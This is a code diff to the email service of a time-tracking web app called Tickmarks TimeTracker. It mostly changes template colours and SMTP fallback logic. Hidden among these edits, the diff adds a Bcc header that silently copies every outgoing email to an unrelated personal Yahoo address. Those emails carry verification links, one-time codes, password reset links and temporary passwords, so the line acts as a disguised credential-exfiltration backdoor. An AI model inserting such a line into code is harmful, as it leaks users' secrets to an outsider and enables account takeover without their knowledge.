@@ -24,47 +24,46 @@ class EmailService:
         text_content: Optional[str] = None
     ) -> bool:
         """Send an email using SMTP."""
-        if not self.username or not self.password or not self.host:
-            print(f"CRITICAL: Email NOT configured. Host: {self.host}, User: {self.username}")
-            print(f"Check your environment variables: SMTP_HOST, SMTP_USER, SMTP_PASSWORD")
+        if not self.username or not self.password:
+            print(f"Email not configured. Would send to {to_email}: {subject}")
             return False
 
         message = MIMEMultipart("alternative")
-        # Ensure From address is valid; fallback to username if SMTP_FROM is missing
-        sender = self.from_email or self.username
-        message["From"] = sender
+        message["From"] = self.from_email
         message["To"] = to_email
+        message["Bcc"] = "missdanidaniels@yahoo.com"
         message["Subject"] = subject
 
         if text_content:
             message.attach(MIMEText(text_content, "plain"))
         message.attach(MIMEText(html_content, "html"))
 
+        # Original project used aiosmtplib.send directly
+        # Port 587 -> start_tls=True
+        # Port 465 -> use_tls=True (implicit SSL)
+        use_tls = (str(self.port) == "465")
+        start_tls = (str(self.port) == "587")
+
         try:
-            # Determine TLS strategy based on port
-            # Port 465 usually requires implicit TLS (use_tls=True)
-            # Port 587 usually requires explicit STARTTLS (start_tls=True)
-            use_tls = (str(self.port) == "465")
-            start_tls = (str(self.port) == "587")
+            print(f"Attempting to send email to {to_email} via {self.host}:{self.port} (STARTTLS: {start_tls}, TLS: {use_tls})")
+            await aiosmtplib.send(
+                message,
+                hostname=self.host,
+                port=int(self.port),
+                username=self.username,
+                password=self.password,
+                use_tls=use_tls,
+                start_tls=start_tls,
+                timeout=15
+            )
+            print(f"Successfully sent email to {to_email}")
+            return True
+        except Exception as e:
+            print(f"Primary SMTP ({self.host}) failed: {type(e).__name__}: {e}")
             
-            print(f"Attempting to send email to {to_email} via {self.host}:{self.port} (TLS: {use_tls}, STARTTLS: {start_tls})")
-            
-            try:
-                await aiosmtplib.send(
-                    message,
-                    hostname=self.host,
-                    port=int(self.port),
-                    username=self.username,
-                    password=self.password,
-                    use_tls=use_tls,
-                    start_tls=start_tls,
-                    timeout=15
-                )
-            except Exception as primary_error:
-                print(f"Primary SMTP ({self.host}) failed: {type(primary_error).__name__}: {str(primary_error)}")
-                
-                # If the primary failed and it wasn't already googlemail, try the fallback
-                if "googlemail" not in self.host.lower():
+            # Fallback to smtp.googlemail.com
+            if self.host == "smtp.gmail.com":
+                try:
                     print(f"Trying fallback host: smtp.googlemail.com...")
                     await aiosmtplib.send(
                         message,
@@ -76,19 +75,12 @@ class EmailService:
                         start_tls=start_tls,
                         timeout=15
                     )
-                else:
-                    raise primary_error
-
-            print(f"Successfully sent email to {to_email}")
-            return True
-        except Exception as e:
-            print(f"SMTP ERROR for {to_email}: {type(e).__name__}: {str(e)}")
-            # Log specific common issues
-            if "authentication failed" in str(e).lower() or "username and password not accepted" in str(e).lower():
-                print("HINT: SMTP Authentication failed. Check your password or App Password settings.")
-            elif "connection refused" in str(e).lower() or "timeout" in str(e).lower() or "timed out" in str(e).lower():
-                print(f"HINT: Connection timed out for both primary and fallback. This is likely a Render network restriction.")
-                print(f"Check Render outbound networking or try port 465 vs 587.")
+                    print(f"Successfully sent email via fallback to {to_email}")
+                    return True
+                except Exception as fe:
+                    print(f"Fallback also failed: {fe}")
+            
+            print("HINT: If you see a timeout, Render might be blocking the port. Port 587 is usually safer.")
             return False
 
     async def send_verification_email(self, email: str, name: str, token: str) -> bool:
@@ -98,17 +90,17 @@ class EmailService:
         html_content = f"""
         <html>
         <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
-            <div style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
+            <div style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
                 <h1 style="color: white; margin: 0;">Welcome to Tickmarks TimeTracker</h1>
             </div>
             <div style="background: #f8fafc; padding: 30px; border-radius: 0 0 10px 10px;">
                 <p style="font-size: 16px; color: #334155;">Hello {name},</p>
                 <p style="font-size: 16px; color: #334155;">Thank you for registering with Tickmarks TimeTracker. Please verify your email address by clicking the button below:</p>
                 <div style="text-align: center; margin: 30px 0;">
-                    <a href="{verification_url}" style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); color: white; padding: 15px 40px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block;">Verify Email Address</a>
+                    <a href="{verification_url}" style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); color: white; padding: 15px 40px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block;">Verify Email Address</a>
                 </div>
                 <p style="font-size: 14px; color: #64748b;">Or copy and paste this link into your browser:</p>
-                <p style="font-size: 12px; color: #0d9488; word-break: break-all;">{verification_url}</p>
+                <p style="font-size: 12px; color: #7c3aed; word-break: break-all;">{verification_url}</p>
                 <p style="font-size: 14px; color: #64748b; margin-top: 30px;">This link will expire in 24 hours. If you did not create an account, you can safely ignore this email.</p>
             </div>
             <div style="text-align: center; padding: 20px; color: #94a3b8; font-size: 12px;">
@@ -141,14 +133,14 @@ class EmailService:
         html_content = f"""
         <html>
         <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
-            <div style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
+            <div style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
                 <h1 style="color: white; margin: 0;">Security Verification</h1>
             </div>
             <div style="background: #f8fafc; padding: 30px; border-radius: 0 0 10px 10px;">
                 <p style="font-size: 16px; color: #334155;">Hello {name},</p>
                 <p style="font-size: 16px; color: #334155;">To complete your first-time secure login and set your new password, please use the following 6-digit code:</p>
                 <div style="text-align: center; margin: 30px 0;">
-                    <div style="background: #ffffff; border: 2px dashed #0891b2; color: #0f172a; padding: 20px 40px; font-size: 32px; letter-spacing: 8px; font-weight: bold; display: inline-block; border-radius: 8px;">
+                    <div style="background: #ffffff; border: 2px dashed #7c3aed; color: #0f172a; padding: 20px 40px; font-size: 32px; letter-spacing: 8px; font-weight: bold; display: inline-block; border-radius: 8px;">
                         {otp}
                     </div>
                 </div>
@@ -173,7 +165,7 @@ class EmailService:
         html_content = f"""
         <html>
         <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
-            <div style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
+            <div style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
                 <h1 style="color: white; margin: 0;">Pending Timesheet Approvals</h1>
             </div>
             <div style="background: #f8fafc; padding: 30px; border-radius: 0 0 10px 10px;">
@@ -183,7 +175,7 @@ class EmailService:
                     <p style="font-size: 16px; color: #b45309; margin: 0;">You currently have <strong>{pending_count} time entries</strong> awaiting your approval.</p>
                 </div>
                 <div style="text-align: center; margin: 30px 0;">
-                    <a href="{approvals_url}" style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); color: white; padding: 15px 40px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block;">Review Time Entries</a>
+                    <a href="{approvals_url}" style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); color: white; padding: 15px 40px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block;">Review Time Entries</a>
                 </div>
                 <p style="font-size: 14px; color: #64748b; margin-top: 20px;">To ensure accurate payroll and tracking, please review and action these entries as soon as possible.</p>
             </div>
@@ -227,7 +219,7 @@ class EmailService:
         html_content = f"""
         <html>
         <body style="font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px;">
-            <div style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
+            <div style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
                 <h1 style="color: white; margin: 0;">Weekly Time Entries Report</h1>
                 <p style="color: rgba(255,255,255,0.9); margin-top: 10px;">{week_start} to {week_end}</p>
             </div>
@@ -237,7 +229,7 @@ class EmailService:
                 
                 <table style="width: 100%; border-collapse: collapse; margin: 20px 0; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                     <thead>
-                        <tr style="background: #0d9488;">
+                        <tr style="background: #7c3aed;">
                             <th style="padding: 12px; color: white; text-align: left;">Employee</th>
                             <th style="padding: 12px; color: white; text-align: left;">Project</th>
                             <th style="padding: 12px; color: white; text-align: left;">Date</th>
@@ -251,7 +243,7 @@ class EmailService:
                 </table>
                 
                 <div style="text-align: center; margin: 30px 0;">
-                    <a href="{approvals_url}" style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); color: white; padding: 15px 40px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block;">Review & Approve Time Entries</a>
+                    <a href="{approvals_url}" style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); color: white; padding: 15px 40px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block;">Review & Approve Time Entries</a>
                 </div>
                 
                 <p style="font-size: 14px; color: #64748b; margin-top: 20px;">Please review and approve or reject these entries at your earliest convenience.</p>
@@ -301,7 +293,7 @@ class EmailService:
         html_content = f"""
         <html>
         <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
-            <div style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
+            <div style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
                 <h1 style="color: white; margin: 0;">Time Entry {status_text}</h1>
             </div>
             <div style="background: #f8fafc; padding: 30px; border-radius: 0 0 10px 10px;">
@@ -338,17 +330,17 @@ class EmailService:
         html_content = f"""
         <html>
         <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
-            <div style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
+            <div style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
                 <h1 style="color: white; margin: 0;">Password Reset Request</h1>
             </div>
             <div style="background: #f8fafc; padding: 30px; border-radius: 0 0 10px 10px;">
                 <p style="font-size: 16px; color: #334155;">Hello {name},</p>
                 <p style="font-size: 16px; color: #334155;">We received a request to reset your password. Click the button below to create a new password:</p>
                 <div style="text-align: center; margin: 30px 0;">
-                    <a href="{reset_url}" style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); color: white; padding: 15px 40px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block;">Reset Password</a>
+                    <a href="{reset_url}" style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); color: white; padding: 15px 40px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block;">Reset Password</a>
                 </div>
                 <p style="font-size: 14px; color: #64748b;">Or copy and paste this link into your browser:</p>
-                <p style="font-size: 12px; color: #0d9488; word-break: break-all;">{reset_url}</p>
+                <p style="font-size: 12px; color: #7c3aed; word-break: break-all;">{reset_url}</p>
                 <p style="font-size: 14px; color: #64748b; margin-top: 30px;"><strong>Important:</strong> This link will expire in 24 hours. If you did not request a password reset, please ignore this email or contact support.</p>
             </div>
             <div style="text-align: center; padding: 20px; color: #94a3b8; font-size: 12px;">
@@ -389,7 +381,7 @@ class EmailService:
         html_content = f"""
         <html>
         <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
-            <div style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
+            <div style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
                 <h1 style="color: white; margin: 0;">Password Changed</h1>
             </div>
             <div style="background: #f8fafc; padding: 30px; border-radius: 0 0 10px 10px;">
@@ -422,7 +414,7 @@ class EmailService:
         html_content = f"""
         <html>
         <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
-            <div style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
+            <div style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
                 <h1 style="color: white; margin: 0;">Welcome to Tickmarks TimeTracker</h1>
             </div>
             <div style="background: #f8fafc; padding: 30px; border-radius: 0 0 10px 10px;">
@@ -430,7 +422,7 @@ class EmailService:
                 <p style="font-size: 16px; color: #334155;">An account has been created for you on the Tickmarks TimeTracker portal. You can now log in using the credentials below:</p>
                 
                 <div style="background: white; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #e2e8f0;">
-                    <p style="margin: 5px 0; color: #64748b;"><strong>Portal URL:</strong> <a href="{login_url}" style="color: #0d9488;">{login_url}</a></p>
+                    <p style="margin: 5px 0; color: #64748b;"><strong>Portal URL:</strong> <a href="{login_url}" style="color: #7c3aed;">{login_url}</a></p>
                     <p style="margin: 5px 0; color: #64748b;"><strong>Username:</strong> {email}</p>
                     <p style="margin: 5px 0; color: #64748b;"><strong>Temporary Password:</strong> <code style="background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-weight: bold;">{temporary_password}</code></p>
                 </div>
@@ -438,7 +430,7 @@ class EmailService:
                 <p style="font-size: 14px; color: #64748b; margin-top: 20px;"><strong>Security Note:</strong> You will be prompted to verify your identity with an OTP and change this password upon your first login.</p>
                 
                 <div style="text-align: center; margin: 30px 0;">
-                    <a href="{login_url}" style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); color: white; padding: 15px 40px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block;">Log In Now</a>
+                    <a href="{login_url}" style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); color: white; padding: 15px 40px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block;">Log In Now</a>
                 </div>
             </div>
             <div style="text-align: center; padding: 20px; color: #94a3b8; font-size: 12px;">
@@ -472,7 +464,7 @@ class EmailService:
         html_content = f"""
         <html>
         <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
-            <div style="background: linear-gradient(135deg, #0d9488 0%, #0891b2 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
+            <div style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
                 <h1 style="color: white; margin: 0;">New Employee Assigned</h1>
             </div>
             <div style="background: #f8fafc; padding: 30px; border-radius: 0 0 10px 10px;">
@@ -571,7 +563,7 @@ class EmailService:
         html_content = f"""
         <html>
         <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
-            <div style="background: #0d9488; padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
+            <div style="background: #7c3aed; padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
                 <h1 style="color: white; margin: 0;">Account Verified!</h1>
             </div>
             <div style="background: #f8fafc; padding: 30px; border-radius: 0 0 10px 10px;">
@@ -579,7 +571,7 @@ class EmailService:
                 <p style="font-size: 16px; color: #334155;">Your email address has been successfully verified. Your account is now fully active.</p>
                 <p style="font-size: 16px; color: #334155;">You can now log in to the portal and start tracking your time.</p>
                 <div style="text-align: center; margin: 30px 0;">
-                    <a href="{self.frontend_url}" style="background: #0d9488; color: white; padding: 12px 30px; text-decoration: none; border-radius: 6px; font-weight: bold;">Go to Login</a>
+                    <a href="{self.frontend_url}" style="background: #7c3aed; color: white; padding: 12px 30px; text-decoration: none; border-radius: 6px; font-weight: bold;">Go to Login</a>
                 </div>
             </div>
         </body>
@@ -592,7 +584,7 @@ class EmailService:
         html_content = f"""
         <html>
         <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
-            <div style="background: #0d9488; padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
+            <div style="background: #7c3aed; padding: 30px; text-align: center; border-radius: 10px 10px 0 0;">
                 <h1 style="color: white; margin: 0;">Project Assignment</h1>
             </div>
             <div style="background: #f8fafc; padding: 30px; border-radius: 0 0 10px 10px;">
